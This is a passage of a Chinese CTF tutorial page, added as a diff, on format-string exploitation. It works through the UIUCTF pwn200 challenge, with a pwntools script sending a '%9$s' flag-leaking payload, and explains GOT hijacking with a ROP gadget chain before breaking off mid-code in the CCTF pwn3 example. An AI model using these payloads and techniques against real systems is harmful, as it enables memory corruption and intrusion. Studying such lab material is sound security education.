@@ -1,0 +1,1359 @@
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="SkYe's Wiki">
+      
+      
+        <link rel="canonical" href="https://wiki.mrskye.cn/fmtstr/fmtstr_example/">
+      
+      
+        <meta name="author" content="SkYe">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.2.2">
+    
+    
+      
+        <title>格式化字符串漏洞例子 - SkYe's Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.a2408e81.min.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.a46bcfb3.min.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#2196f3">
+      
+    
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
+        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+      <link rel="stylesheet" href="../../_static/css/extra.css">
+    
+    
+      
+        
+<link rel="preconnect dns-prefetch" href="https://www.google-analytics.com">
+<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview")})</script>
+<script async src="https://www.google-analytics.com/analytics.js"></script>
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="blue" data-md-color-accent="red">
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#_1" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="https://wiki.mrskye.cn/" title="SkYe's Wiki" class="md-header-nav__button md-logo" aria-label="SkYe's Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            SkYe's Wiki
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              格式化字符串漏洞例子
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header-nav__source">
+        
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+      </div>
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+        
+      
+      
+        
+          
+
+  
+
+<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        Home
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../knowledge_point_%26_title_index/" class="md-tabs__link md-tabs__link--active">
+          Pwn
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="https://wiki.mrskye.cn/" title="SkYe's Wiki" class="md-nav__button md-logo" aria-label="SkYe's Wiki">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>
+
+    </a>
+    SkYe's Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      
+<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    skyedai910/wiki.mrskye.cn
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Pwn
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../knowledge_point_%26_title_index/" title="知识点&题目索引" class="md-nav__link">
+      知识点&题目索引
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2" checked>
+    
+    <label class="md-nav__link" for="nav-2-2">
+      格式化字符串
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        格式化字符串
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
+      格式化字符串漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        格式化字符串漏洞例子
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
+        </span>
+      </label>
+    
+    <a href="./" title="格式化字符串漏洞例子" class="md-nav__link md-nav__link--active">
+      格式化字符串漏洞例子
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#64" class="md-nav__link">
+    64 位程序格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav" aria-label="64 位程序格式化字符串漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav" aria-label="例子">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-got" class="md-nav__link">
+    hijack GOT
+  </a>
+  
+    <nav class="md-nav" aria-label="hijack GOT">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav" aria-label="例子">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    漏洞利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    漏洞利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-retaddr" class="md-nav__link">
+    hijack retaddr
+  </a>
+  
+    <nav class="md-nav" aria-label="hijack retaddr">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav" aria-label="例子">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    修改地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      链接器
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="链接器" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        链接器
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../linker/statically_linked/" title="静态链接程序利用" class="md-nav__link">
+      静态链接程序利用
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#64" class="md-nav__link">
+    64 位程序格式化字符串漏洞
+  </a>
+  
+    <nav class="md-nav" aria-label="64 位程序格式化字符串漏洞">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav" aria-label="例子">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-got" class="md-nav__link">
+    hijack GOT
+  </a>
+  
+    <nav class="md-nav" aria-label="hijack GOT">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav" aria-label="例子">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    漏洞利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    漏洞利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hijack-retaddr" class="md-nav__link">
+    hijack retaddr
+  </a>
+  
+    <nav class="md-nav" aria-label="hijack retaddr">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav" aria-label="例子">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    确定保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    分析程序
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    利用思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    确定偏移
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    修改地址
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    利用程序
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/fmtstr/fmtstr_example.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                  
+                
+                
+                <h1 id="_1">格式化字符串漏洞例子</h1>
+<blockquote>
+<p>绝大部分内容来自 CTF-WIKI ，内容引用用于学习记录</p>
+</blockquote>
+<h2 id="64">64 位程序格式化字符串漏洞</h2>
+<h3 id="_2">原理</h3>
+<p>其实 64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中的。那么在格式化字符串漏洞中呢？<strong>虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</strong></p>
+<h3 id="_3">例子</h3>
+<h4 id="_4">确定保护</h4>
+<p>这里，我们以 2017 年的 UIUCTF 中 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a> 为例进行介绍。这里由于只有本地环境，所以我在本地设置了一个 flag.txt 文件。</p>
+<pre><code class="shell">➜  2017-UIUCTF-pwn200-GoodLuck git:(master) ✗ checksec goodluck
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+
+<p>可以看出程序开启了 Canary、NX 保护以及部分 RELRO 保护。</p>
+<h4 id="_5">分析程序</h4>
+<p>可以发现，程序的漏洞很明显</p>
+<pre><code class="c">for ( j = 0; j &lt;= 21; ++j )
+{
+    v5 = format[j];
+    if ( !v5 || v11[j] != v5 )
+    {
+        puts(&quot;You answered:&quot;);
+        printf(format);
+        puts(&quot;\nBut that was totally wrong lol get rekt&quot;);
+        fflush(_bss_start);
+        result = 0;
+        goto LABEL_11;
+    }
+}
+</code></pre>
+
+<p>可以看到 flag 对应的栈上的偏移为 5，除去对应的第一行为返回地址外，其偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 10。而 fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 <code>%9$s</code> 即可得到 flag 的内容。当然，我们还有更简单的方法利用 https://github.com/scwuaptx/Pwngdb 中的 fmtarg 来判断某个参数的偏移。</p>
+<pre><code class="shell">gef➤  fmtarg 0x00007fffffffdb28
+The index of format argument : 10
+</code></pre>
+
+<p>需要注意的是我们必须 break 在 printf 处。</p>
+<blockquote>
+<p>来自 resery 师傅注解：</p>
+<p>这里的 10 是由 5+5 得到的，至于为什么是这两个 5 是从哪里的得到的，我来解释一下，前面的 5：由于 64 为程序，前 64 个参数是存在寄存器中的，分别是 rdi，rsi，rcx，rdx，r8，r9，所以第一个格式化字符串是存储在 rdi 中的，所以 flag 对应的偏移就应该是 5+flag 在栈中的偏移，在栈中的偏移就很好理解了就是 5，所以 flag 对应的格式化字符串偏移为 10</p>
+</blockquote>
+<p><strong>注解</strong></p>
+<ol>
+<li>
+<p>我安装的 Pwndbg 并没有 fmtarg  ，可能是版本不对，如果需要安装一下 gef 插件。</p>
+</li>
+<li>
+<p>两个作者都解释了偏移 10 是怎么计算来，但我更喜欢的方法是<strong>输入一长串 %p 得出输入字符串的偏移是多少，然后再计算目标偏移或地址</strong>。</p>
+</li>
+</ol>
+<p><code>shell
+   $ ./goodluck 
+   what's the flag
+   bbbbbbbb%p%p%p%p%p%p%p%p%p%p%p
+   You answered:
+   bbbbbbbb0x6020100x7ffff7dd37800x7ffff7b042c00x7ffff7fdc7000x7ffff7fdc7010x620000010x6028300x6020100x7fffffffdd300x6161617b67616c660x6161616161616161
+   But that was totally wrong lol get rekt</code></p>
+<p>0x602830 是第 7 位。为什么泄露的不是 0x6262626262626262 ？前面提到了，64 位系统的前六个参数是寄存器传参的，而 bbbbbbbb 是第一个参数自然在寄存器中存放，0x602830 就是存储的寄存器地址。怎么获得这个地址？gdb 调试断点打在 printf 函数：</p>
+<p><img alt="fmrstr_0" src="../img/fmrstr_0.png" /></p>
+<p>这样得出最后的 flag 偏移为 10 。</p>
+<h4 id="_6">利用程序</h4>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+# 这个库没有用到可以注释掉
+# from LibcSearcher import *
+goodluck = ELF('./goodluck')
+if args['REMOTE']:
+    sh = remote('pwn.sniperoj.cn', 30017)
+else:
+    sh = process('./goodluck')
+payload = &quot;%9$s&quot;
+print payload
+##gdb.attach(sh)
+sh.sendline(payload)
+print sh.recv()
+sh.interactive()
+</code></pre>
+
+<h2 id="hijack-got">hijack GOT</h2>
+<h3 id="_7">原理</h3>
+<p>在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的（延迟绑定技术）。此外，在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
+<p>假设我们将函数 A 的地址覆盖为函数 B 的地址，那么这一攻击技巧可以分为以下步骤</p>
+<ul>
+<li>
+<p>确定函数 A 的 GOT 表地址。</p>
+</li>
+<li>
+<p>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。（因为这类函数会在程序源码中使用到，所以能直接或间接从 elf 文件中读取）</p>
+</li>
+<li>
+<p>确定函数 B 的内存地址</p>
+</li>
+<li>
+<p>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</p>
+</li>
+<li>
+<p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p>
+</li>
+<li>
+<p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
+<ul>
+<li>写入函数：write 函数（常见）</li>
+<li>格式化字符串任意地址写（常见）</li>
+<li>ROP</li>
+</ul>
+<p><code>pop eax; ret;           # printf@got -&gt; eax
+pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx
+add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</code></p>
+</li>
+</ul>
+<h3 id="_8">例子</h3>
+<p>这里我们以 2016 CCTF 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">pwn3</a> 为例进行介绍。</p>
+<h4 id="_9">确定保护</h4>
+<p>如下</p>
+<pre><code class="shell">➜  2016-CCTF-pwn3 git:(master) ✗ checksec pwn3 
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+
+<p>可以看出程序主要开启了 NX 保护。RELRO 是部分保护，这种状态下可以修改 GOT 表，如果是 FULL 则不行。另外我们一般默认远程都是开启 ASLR 保护的。</p>
+<h4 id="_10">分析程序</h4>
+<p>首先分析程序，可以发现程序似乎主要实现了一个需密码登录的 ftp，具有 get，put，dir 三个基本功能。大概浏览一下每个功能的代码，发现在 get 功能中存在格式化字符串漏洞</p>
+<pre><code class="c">int get_file()
+{
+  char dest; // [sp+1Ch] [bp-FCh]@5
+  char s1; // [sp+E4h] [bp-34h]@1
+  char *i; // [sp+10Ch] [bp-Ch]@3
+
+  printf(&quot;enter the file name you want to get:&quot;);
+  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);
+  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )
+    puts(&quot;too young, too simple&quot;);
+  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )
+  {
